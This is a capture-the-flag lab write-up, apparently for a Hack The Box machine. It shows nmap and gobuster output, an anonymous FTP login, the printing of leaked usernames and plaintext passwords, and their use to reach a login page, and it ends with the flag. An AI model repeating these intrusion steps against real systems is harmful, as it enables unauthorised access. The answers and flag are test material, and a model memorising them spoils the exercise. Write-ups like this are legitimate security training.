# Target Info
Target Machine IP = 10.129.159.101

# Solution
1. -sC
2. run nmap scan, 
```
○ sudo nmap -sC -sV 10.129.159.101
[sudo] password for zeta:
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 22:29 WIB
Nmap scan report for 10.129.159.101
Host is up (1.3s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.16.47
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.52 seconds
```
3. do ftp with anonymous login, 230
```
○ ftp 10.129.159.101
Connected to 10.129.159.101.
220 (vsFTPd 3.0.3)
Name (10.129.159.101:zeta): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
4. anonymous
5. get
6. ftp get the data, admin
```
ftp> ls
229 Entering Extended Passive Mode (|||49217|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```
inside the files
```
○ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
○ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```
7. Apache httpd 2.4.41
8. -x
9. run gobuster, login.php
```
○ gobuster dir -u 10.129.159.101 -w SecLists/Discovery/Web-Content/PHP.fuzz.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.159.101
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/PHP.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/21 22:39:46 Starting gobuster in directory enumeration mode
===============================================================
Progress: 104 / 105 (99.05%)
//login.php           (Status: 200) [Size: 1577]
===============================================================
2023/05/21 22:39:59 Finished
===============================================================
```
10. get the flag
login with the accounts found from allowed.userlist files
![image](https://github.com/ilhamhanifan/hackerman/assets/53177896/f36674f5-d5c2-4188-b064-3abef701ecf5)
flag is on the dashboard page
![image](https://github.com/ilhamhanifan/hackerman/assets/53177896/a569251f-094e-409c-835f-190a26037d5a)

flag = c7110277ac44d78b6a9fff2232434d16
